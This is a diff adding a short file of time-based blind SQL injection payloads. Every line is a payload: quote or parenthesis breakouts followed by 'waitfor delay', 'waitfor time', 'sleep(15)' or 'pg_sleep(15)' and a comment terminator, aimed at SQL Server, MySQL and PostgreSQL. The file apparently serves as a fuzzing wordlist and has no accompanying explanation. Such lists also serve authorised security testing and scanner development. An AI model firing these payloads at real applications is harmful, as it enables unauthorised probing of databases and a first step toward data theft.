@@ -1,0 +1,12 @@
+' waitfor delay '0:0:15' --
+');waitfor delay '0:0:15' --
+1,'0');waitfor delay '0:0:15' --
+' waitfor time '0:0:15' --
+');waitfor time '0:0:15' --
+1,'0');waitfor time '0:0:15' --
+' sleep(15) --
+') sleep(15) --
+1,'0') sleep(15) --
+' pg_sleep(15) --
+') pg_sleep(15) --
+1,'0') pg_sleep(15) --
